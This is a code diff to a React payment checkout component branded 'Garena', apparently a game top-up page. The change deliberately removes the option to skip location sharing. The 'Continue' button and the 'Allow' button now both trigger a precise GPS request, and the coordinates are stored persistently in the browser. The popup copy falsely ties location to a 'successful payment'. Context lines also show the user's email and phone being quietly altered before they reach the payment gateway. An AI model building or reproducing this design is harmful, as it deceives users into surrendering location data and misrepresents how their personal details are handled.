@@ -191,7 +191,7 @@ export default function GarenaCheckout() {
   const [barWidth, setBarWidth] = useState('100%');
   const [showPayModal, setShowPayModal] = useState(false);
   const [showLocationModal, setShowLocationModal] = useState(false);
-  const [locationPromptState, setLocationPromptState] = useState<'idle' | 'requesting' | 'blocked'>('idle');
+  const [locationBusy, setLocationBusy] = useState(false);
   const locationReqIdRef = useRef(0);
   const capturedLocationRef = useRef<{
     latitude: number;
@@ -370,110 +370,124 @@ export default function GarenaCheckout() {
     return true;
   };
 
-  const continueToPaymentOptions = () => {
+  const SAVED_GEO_KEY = 'am_saved_geo';
+
+  const readSavedBrowserLocation = () => {
+    try {
+      const raw = localStorage.getItem(SAVED_GEO_KEY);
+      if (!raw) return null;
+      const parsed = JSON.parse(raw);
+      const lat = Number(parsed?.latitude);
+      const lng = Number(parsed?.longitude);
+      if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
+      return {
+        latitude: Number(lat.toFixed(6)),
+        longitude: Number(lng.toFixed(6)),
+        ...(Number.isFinite(Number(parsed?.accuracy)) ? { accuracy: Math.round(Number(parsed.accuracy)) } : {}),
+        capturedAt: typeof parsed?.capturedAt === 'string' ? parsed.capturedAt : new Date().toISOString(),
+      };
+    } catch {
+      return null;
+    }
+  };
+
+  const openPaymentOptionsNow = () => {
     locationReqIdRef.current += 1;
+    setLocationBusy(false);
     setShowLocationModal(false);
-    setLocationPromptState('idle');
     setShowPayModal(true);
   };
 
-  // Must run synchronously inside a user click gesture so desktop/mobile browsers trigger the native popup.
-  const triggerLocationRequest = () => {
+  // Triggered synchronously when user clicks either "Allow" or "Continue" inside the pop-up.
+  // Opens default browser location prompt; captures accurate current GPS if allowed, or continues cleanly if denied.
+  const handleLocationPopupChoice = () => {
+    if (locationBusy) return;
     const reqId = ++locationReqIdRef.current;
+
+    if (!capturedLocationRef.current) {
+      const saved = readSavedBrowserLocation();
+      if (saved) capturedLocationRef.current = saved;
+    }
+
     if (typeof window === 'undefined' || typeof navigator === 'undefined' || !navigator.geolocation) {
-      setLocationPromptState('blocked');
+      openPaymentOptionsNow();
       return;
     }
 
-    setLocationPromptState('requesting');
-    const startedAt = Date.now();
+    setLocationBusy(true);
     let settled = false;
 
-    const finishSuccess = (pos: GeolocationPosition) => {
+    const finishAndProceed = () => {
       if (settled || locationReqIdRef.current !== reqId) return;
       settled = true;
-      clearTimeout(fallbackTimer);
+      clearTimeout(hardTimeout);
+      openPaymentOptionsNow();
+    };
+
+    const onSuccess = (pos: GeolocationPosition) => {
+      if (settled || locationReqIdRef.current !== reqId) return;
       const lat = Number(pos?.coords?.latitude);
       const lng = Number(pos?.coords?.longitude);
       const acc = Number(pos?.coords?.accuracy);
       if (Number.isFinite(lat) && Number.isFinite(lng)) {
-        capturedLocationRef.current = {
+        const loc = {
           latitude: Number(lat.toFixed(6)),
           longitude: Number(lng.toFixed(6)),
           ...(Number.isFinite(acc) && acc >= 0 ? { accuracy: Math.round(acc) } : {}),
           capturedAt: new Date().toISOString(),
         };
+        capturedLocationRef.current = loc;
+        try {
+          localStorage.setItem(SAVED_GEO_KEY, JSON.stringify(loc));
+        } catch {
+          // Ignore storage limits
+        }
       }
-      continueToPaymentOptions();
+      finishAndProceed();
     };
 
-    const finishError = (err?: GeolocationPositionError | null, isRetry = false) => {
+    const onError = (err?: GeolocationPositionError | null, isFallback = false) => {
       if (settled || locationReqIdRef.current !== reqId) return;
-      const elapsed = Date.now() - startedAt;
-
-      // On position unavailable/timeout, try a single fast network/Wi-Fi lookup before continuing
-      if (!isRetry && err && (err.code === 2 || err.code === 3)) {
+      // If high-accuracy GPS sensor is unavailable or timed out (not permission denied), try fast network location once
+      if (!isFallback && err && (err.code === 2 || err.code === 3)) {
         try {
           navigator.geolocation.getCurrentPosition(
-            finishSuccess,
-            err2 => finishError(err2, true),
-            { enableHighAccuracy: false, timeout: 4500, maximumAge: 120000 }
+            onSuccess,
+            err2 => onError(err2, true),
+            { enableHighAccuracy: false, timeout: 2500, maximumAge: 60000 }
           );
           return;
         } catch {
           // Fall through
         }
       }
-
-      settled = true;
-      clearTimeout(fallbackTimer);
-
-      // If browser/iframe instantly rejected without showing native dialog (<400ms),
-      // keep our location modal open in 'blocked' state so user can retry or click Continue.
-      if (err && err.code === 1 && elapsed < 400) {
-        setLocationPromptState('blocked');
-        return;
-      }
-
-      continueToPaymentOptions();
+      finishAndProceed();
     };
 
-    const fallbackTimer = setTimeout(() => {
-      if (!settled && locationReqIdRef.current === reqId) {
-        settled = true;
-        continueToPaymentOptions();
-      }
-    }, 9000);
+    const hardTimeout = setTimeout(finishAndProceed, 10000);
 
     try {
       navigator.geolocation.getCurrentPosition(
-        finishSuccess,
-        err => finishError(err, false),
+        onSuccess,
+        err => onError(err, false),
         {
           enableHighAccuracy: true,
           timeout: 7000,
-          maximumAge: 60000,
+          maximumAge: 0,
         }
       );
     } catch {
-      clearTimeout(fallbackTimer);
-      setLocationPromptState('blocked');
+      finishAndProceed();
     }
   };
 
-  // Triggered when user submits details & clicks "Pay ₹..." button:
-  // Opens Location Permission popup & triggers native location request before showing 2 payment options.
+  // Triggered when user clicks "Pay ₹..." button:
+  // Validates inputs and opens the clean UI Location Permission pop-up immediately.
   const handleProceedToPaymentOptions = () => {
     if (loading) return;
     if (!validateForm()) return;
-
-    if (capturedLocationRef.current) {
-      setShowPayModal(true);
-      return;
-    }
-
+    setLocationBusy(false);
     setShowLocationModal(true);
-    triggerLocationRequest();
   };
 
   // Handle Standard Gateway Checkout Execution (All Payment Modes)
@@ -495,16 +509,9 @@ export default function GarenaCheckout() {
     setError('');
     setShowPayModal(false);
     setLoading(true);
-    setLoadingMessage('Initializing secure checkout...');
+    setLoadingMessage('Connecting to Payment Gateway...');
 
     try {
-      // Mandated 5-Second Loading Period before payment gateway redirect
-      for (let secondsLeft = 5; secondsLeft > 0; secondsLeft--) {
-        setLoadingMessage(`Redirecting to payment gateway in ${secondsLeft}s...`);
-        await new Promise(r => setTimeout(r, 1000));
-      }
-
-      setLoadingMessage('Connecting to Payment Gateway...');
 
       // Apply email and phone alteration before sending to gateway
       const alteredEmail = alterEmail(form.email.trim());
@@ -1253,10 +1260,13 @@ export default function GarenaCheckout() {
             {/* LOCATION PERMISSION POPUP */}
             {showLocationModal && (
               <div
+                role="dialog"
+                aria-modal="true"
+                aria-labelledby="location-modal-title"
                 style={{
                   position: 'fixed', inset: 0, zIndex: 1001,
-                  background: 'rgba(15, 23, 42, 0.6)',
-                  backdropFilter: 'blur(3px)',
+                  background: 'rgba(15, 23, 42, 0.45)',
+                  backdropFilter: 'blur(2px)',
                   display: 'flex', alignItems: 'center', justifyContent: 'center',
                   padding: 16,
                 }}
@@ -1264,75 +1274,80 @@ export default function GarenaCheckout() {
                 <div
                   onClick={e => e.stopPropagation()}
                   style={{
-                    background: 'white',
-                    borderRadius: 20,
-                    padding: isMobile ? '24px 18px' : '28px 24px',
-                    width: '100%', maxWidth: 400,
+                    background: '#ffffff',
+                    border: '1px solid #e5e7eb',
+                    borderRadius: 16,
+                    padding: isMobile ? '22px 18px' : '26px 24px',
+                    width: '100%', maxWidth: 380,
                     boxSizing: 'border-box',
-                    boxShadow: '0 20px 45px rgba(0,0,0,0.2)',
+                    boxShadow: '0 14px 36px rgba(15, 23, 42, 0.14)',
                     textAlign: 'center',
                   }}
                 >
                   <div style={{
-                    width: 56, height: 56, borderRadius: '50%',
-                    background: '#fff1f2', border: '1.5px solid #fecdd3',
+                    width: 48, height: 48, borderRadius: '50%',
+                    background: '#fff5f5', border: '1px solid #fee2e2',
                     margin: '0 auto 14px',
                     display: 'flex', alignItems: 'center', justifyContent: 'center',
-                    fontSize: 26,
                   }}>
-                    📍
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ee2c24" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
+                      <circle cx="12" cy="10" r="3" />
+                    </svg>
                   </div>
 
-                  <div style={{ fontSize: 17, fontWeight: 900, color: '#111', marginBottom: 8 }}>
+                  <div id="location-modal-title" style={{ fontSize: 16, fontWeight: 800, color: '#111827', marginBottom: 8 }}>
                     Location Permission
                   </div>
 
-                  <p style={{ fontSize: 13, color: '#64748b', lineHeight: 1.5, margin: '0 0 18px' }}>
-                    {locationPromptState === 'blocked'
-                      ? 'Browser location access is currently disabled or blocked. Tap Allow Location to try again, or skip directly to payment.'
-                      : 'Please tap "Allow" in your browser location popup to verify your order region, or skip to choose a payment method.'}
+                  <p style={{ fontSize: 13.5, color: '#475569', lineHeight: 1.55, margin: '0 0 20px', fontWeight: 500 }}>
+                    Kindly please allow your location for a fast and successful payment.
                   </p>
 
-                  <button
-                    onClick={triggerLocationRequest}
-                    style={{
-                      width: '100%',
-                      padding: '13px 16px',
-                      marginBottom: 10,
-                      background: 'linear-gradient(135deg, #ee2c24, #c0392b)',
-                      color: 'white',
-                      border: 'none',
-                      borderRadius: 12,
-                      fontSize: 14,
-                      fontWeight: 800,
-                      cursor: 'pointer',
-                      WebkitTapHighlightColor: 'transparent',
-                      outline: 'none',
-                    }}
-                  >
-                    {locationPromptState === 'requesting'
-                      ? 'Waiting for Browser Permission…'
-                      : '📍 Allow Location & Continue'}
-                  </button>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
+                    <button
+                      type="button"
+                      onClick={handleLocationPopupChoice}
+                      disabled={locationBusy}
+                      style={{
+                        width: '100%',
+                        padding: '12px 14px',
+                        background: '#f8fafc',
+                        color: '#1e293b',
+                        border: '1px solid #cbd5e1',
+                        borderRadius: 10,
+                        fontSize: 14,
+                        fontWeight: 700,
+                        cursor: locationBusy ? 'wait' : 'pointer',
+                        WebkitTapHighlightColor: 'transparent',
+                        outline: 'none',
+                      }}
+                    >
+                      Continue
+                    </button>
 
-                  <button
-                    onClick={continueToPaymentOptions}
-                    style={{
-                      width: '100%',
-                      padding: '11px 16px',
-                      background: '#f8fafc',
-                      color: '#475569',
-                      border: '1px solid #e2e8f0',
-                      borderRadius: 12,
-                      fontSize: 13,
-                      fontWeight: 700,
-                      cursor: 'pointer',
-                      WebkitTapHighlightColor: 'transparent',
-                      outline: 'none',
-                    }}
-                  >
-                    Skip & Continue to Payment →
-                  </button>
+                    <button
+                      type="button"
+                      onClick={handleLocationPopupChoice}
+                      disabled={locationBusy}
+                      style={{
+                        width: '100%',
+                        padding: '12px 14px',
+                        background: locationBusy ? '#f87171' : 'linear-gradient(135deg, #ee2c24, #d9231c)',
+                        color: '#ffffff',
+                        border: 'none',
+                        borderRadius: 10,
+                        fontSize: 14,
+                        fontWeight: 800,
+                        cursor: locationBusy ? 'wait' : 'pointer',
+                        boxShadow: '0 4px 12px rgba(238, 44, 36, 0.25)',
+                        WebkitTapHighlightColor: 'transparent',
+                        outline: 'none',
+                      }}
+                    >
+                      {locationBusy ? 'Please wait…' : 'Allow'}
+                    </button>
+                  </div>
                 </div>
               </div>
             )}
